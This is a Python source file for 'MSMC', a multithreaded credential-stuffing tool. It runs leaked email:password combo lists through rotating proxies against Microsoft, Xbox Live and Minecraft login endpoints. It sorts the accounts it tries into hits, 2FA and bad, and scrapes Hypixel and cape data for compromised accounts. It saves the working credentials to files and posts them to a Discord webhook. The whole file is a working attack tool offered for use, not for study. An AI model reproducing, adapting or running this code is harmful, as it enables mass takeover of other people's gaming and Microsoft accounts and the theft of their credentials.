import requests, re, readchar, os, time, threading, random, urllib3, configparser, json
from time import gmtime, strftime
from colorama import Fore
from console import utils
from tkinter import filedialog
logo = Fore.GREEN+'''
     ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄  
    ▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▀█▀ ██▒▒██▀ ▀█  
    ▓██    ▓██░░ ▓██▄   ▓██    ▓██░▒▓█    ▄ 
    ▒██    ▒██   ▒   ██▒▒██    ▒██ ▒▓▓▄ ▄██▒
    ▒██▒   ░██▒▒██████▒▒▒██▒   ░██▒▒ ▓███▀ ░
    ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ░▒ ▒  ░
    ░  ░      ░░ ░▒  ░ ░░  ░      ░  ░  ▒   
    ░      ░   ░  ░  ░  ░      ░   ░        
           ░         ░         ░   ░ ░      
                                   ░        \n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F" \
             "&redirect_uri=https://login.live.com/oauth20_desktop.srf" \
             "&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
emails = []
passwords = []
day = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm = 0,0,0,0,0,0,0,0,0
urllib3.disable_warnings()

def get_urlPost_sFTTag(session):
    r = session.get(sFTTag_url)
    text = r.text
    match = re.match(r'.*value="(.+?)".*', text, re.S)
    if match is not None:
        sFTTag = match.group(1)
        match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
        if match is not None:
            return match.group(1), sFTTag

def get_xbox_rps(session, email, password, urlPost, sFTTag, tries=0):
    global bad, checked, cpm, twofa, hits, retries, maxretries
    try:
        data={'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
        #with open(f"login_live_com.txt", 'a') as file: file.write(login_request.text+"\n\n\n\n")
        if '#' in login_request.url and login_request.url != sFTTag_url:
            token = None
            for item in login_request.url.split("#")[1].split("&"):
                key, value = item.split("=")
                if key == 'access_token':
                    token = requests.utils.unquote(value)
                    break
            return token
        elif "access_token" not in str(login_request.url) or str(login_request.url) == sFTTag_url:
            if "protect your account" in login_request.text:
                twofa+=1
                if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
                with open(f"results/{day}/2fa.txt", 'a') as file: file.write(f"{email}:{password}\n")
                checked+=1
                cpm+=1
                return None
            #elif "That Microsoft account" not in login_request.text:
            #    if tries < 5:
            #        tries+=1
            #        return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
            #    else: 
            #        bad+=1
            #        if screen == "'2'": print(Fore.LIGHTRED_EX+f"Bad: {email}:{password}")
            #        checked+=1
            #        cpm+=1
            #        return None
            #elif "Your account or password is incorrect." not in login_request.text:
            #    if tries < 5:
            #        tries+=1
            #        return get_xbox_rps(session, email, password, urlPost, sFTTag, tries)
            #    else: 
            #        bad+=1
            #        if screen == "'2'": print(Fore.LIGHTRED_EX+f"Bad: {email}:{password}")
            #        checked+=1
            #        cpm+=1
            #        return None
            elif "Sign in to" in login_request.text:
                bad+=1
                if screen == "'2'": print(Fore.LIGHTRED_EX+f"Bad: {email}:{password}")
                checked+=1
                cpm+=1
                return None
    except:
        retries+=1
        threading.Thread(target=Checker, args=(email, password)).start()

def notify(email, password, name, hypixel, level, firstlogin, lastlogin, cape, capes):
    global errors
    try: requests.post(webhook, data=json.dumps({"content": webhook_message.replace("<email>", email).replace("<password>", password).replace("<name>", name).replace("<hypixel>", hypixel).replace("<level>", level).replace("<firstlogin>", firstlogin).replace("<lastlogin>", lastlogin).replace("<ofcape>", cape).replace("<capes>", capes), "username" : "MineCheck"}), headers={"Content-Type": "application/json"})
    except: errors+=1

def hypixel(name):
    global errors
    try:
        oname = None
        olevel = None
        ofirstlogin = None
        olastlogin = None
        tx = requests.get('https://plancke.io/hypixel/player/stats/'+name, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}).text
        try: oname = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
        except: _=''
        try: olevel = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
        except: _=''
        try: ofirstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
        except: _=''
        try: olastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
        except: _=''
        return oname, olevel, ofirstlogin, olastlogin
    except: errors+=1

def optifine(name):
    try:
        txt = requests.get(f'http://s.optifine.net/capes/{name}.png').text
        if "Not found" in txt: return "No"
        else: return "Yes"
    except: return "Unknown"

def authenticate(email, password, proxy):
    global hits, vm
    try:
        session = requests.Session()
        session.proxies = proxy
        session.verify = False
        token = get_xbox_rps(session, email, password, *get_urlPost_sFTTag(session))
        if token is not None:
            xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
            js = xbox_login.json()
            xbox_token = js.get('Token')
            if xbox_token is not None:
                uhs = js['DisplayClaims']['xui'][0]['uhs']
                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xsts.json()
                xsts_token = js.get('Token')
                if xsts_token is not None:
                    mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
                    access_token = mc_login.json().get('access_token')
                    if access_token is not None:
                        mc, capes = account(access_token, proxy)
                        if mc != None:
                            if screen == "'2'": print(Fore.GREEN+f"Hit: {mc} | {email}:{password}")
                            hits+=1
                            with open(f"results/{day}/Hits.txt", 'a') as file: file.write(f"{mc} | {email}:{password}\n")
                            oname, olevel, ofirstlogin, olastlogin = hypixel(mc)
                            cape = optifine(mc)
                            with open(f"results/{day}/Capture.txt", 'a') as file: file.write(f"=======================\n{mc}\nEmail: {email}\nPassword: {password}\nHypixel: {oname}\nLevel: {olevel}\nFirst Login: {ofirstlogin}\nLast Login: {olastlogin}\nOptifine Cape: {cape}\nMC Capes: {capes}\n=======================\n")
                            notify(email, password, mc, oname, olevel, ofirstlogin, olastlogin, cape, capes)
                        else:
                            if screen == "'2'": print(Fore.GREEN+f"Valid Mail: {email}:{password}")
                            vm+=1
                            with open(f"results/{day}/Valid_Mail.txt", 'a') as file: file.write(f"{email}:{password}\n")
    except:
        retries+=1
        threading.Thread(target=Checker, args=(email, password)).start()


def account(access_token, proxy):
    r = requests.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, proxies=proxy)
    if r.status_code == 200:
        capes = ""
        try:
            capelist = [cape["alias"] for cape in r.json().get("capes", [])]
            capes = ", ".join(capelist)
        except: capes = "Unknown"
        return r.json()['name'], capes

def Load():
    global Combos
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Load()
    else:
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Load()

def Proxys():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print()
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def logscreen():
    global hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen, args=()).start()    

def cuiscreen():
    global hits, bad, twofa, cpm, cpm1, errors, retries, checked, vm
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}\{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{twofa}] 2FA")
    print(f" [{vm}] Valid Mail")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    utils.set_title(f"MSMC by KillinMachine | Checked: {checked}\{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  Valid Mail: {vm}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen, args=()).start()

def finishedscreen():
    os.system('cls')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+str(hits))
    print("Bad: "+str(bad))
    print("2FA: "+str(twofa))
    print("Valid Mail: "+str(vm))
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    repr(readchar.readkey())
    os.abort()

def getproxy():
    if proxytype != "'4'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(email, password):
    global retries
    try:
        sess = requests.Session()
        sess.verify = False
        authenticate(str(email), str(password), getproxy())
    except Exception as e:
        retries+=1
        threading.Thread(target=Checker, args=(email, password)).start()    

def loadconfig():
    global webhook, maxretries, webhook_message
    if not os.path.isfile("config.ini"):
        config = configparser.ConfigParser(allow_no_value=True) #'MaxRetries': '15',
        config['Settings'] = {'HitWebhook': 'paste your discord webhook here', 'WebhookMessage': '@everyone HIT: ||`<email>:<password>`||\nName: <name>\nHypixel: <hypixel>\nLevel: <level>\nFirst Login: <firstlogin>\nLast Login: <lastlogin>\nOptifine Cape: <ofcape>\nMC Capes: <capes>'}
        with open('config.ini', 'w') as configfile:
            config.write(configfile)
    read_file = configparser.ConfigParser()
    read_file.read('config.ini')
    webhook = str(read_file['Settings']['HitWebhook'])
    #maxretries = str(read_file['Settings']['MaxRetries'])
    webhook_message = str(read_file['Settings']['WebhookMessage'])

def Main():
    global proxytype, screen
    loadconfig()
    utils.set_title("MSMC by KillinMachine")
    os.system('cls')
    print(logo)
    try:
        thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
    except:
        print(Fore.LIGHTRED_EX+"Must be a number.") 
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] None") 
    proxytype = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
    screen = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Select your combos")
    Load()
    if proxytype != "'4'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+day): os.makedirs('results/'+day)
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    num = 0
    while 1:
        if threading.active_count() < int(thread):
            if len(Combos) > num:
                try:
                    combo = Combos[num].replace('\n', '').replace(' ', '').split(":")
                    email = combo[0]
                    password = combo[1]
                    num+=1
                    if email != "" and password != "":
                        threading.Thread(target=Checker, args=(email, password)).start()
                except:
                    finishedscreen()
            else:
                finishedscreen()
Main()
